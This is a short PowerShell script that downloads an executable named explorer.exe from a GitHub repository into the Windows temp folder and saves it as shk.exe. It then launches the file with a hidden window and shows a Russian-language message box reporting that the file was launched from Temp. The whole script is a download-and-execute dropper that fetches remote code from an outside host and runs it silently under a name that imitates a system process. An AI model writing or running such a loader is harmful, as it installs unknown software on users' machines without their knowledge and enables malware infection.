$u="https://github.com/3465h/idkkkk/raw/refs/heads/main/explorer.exe";
$p="$env:temp\shk.exe";
curl.exe -L $u -o $p;
saps $p -WindowStyle Hidden;
Add-Type -AssemblyName Microsoft.VisualBasic;
[Microsoft.VisualBasic.Interaction]::MsgBox("Файл успешно запущен из Temp!", "OKOnly,Information", "Статус")
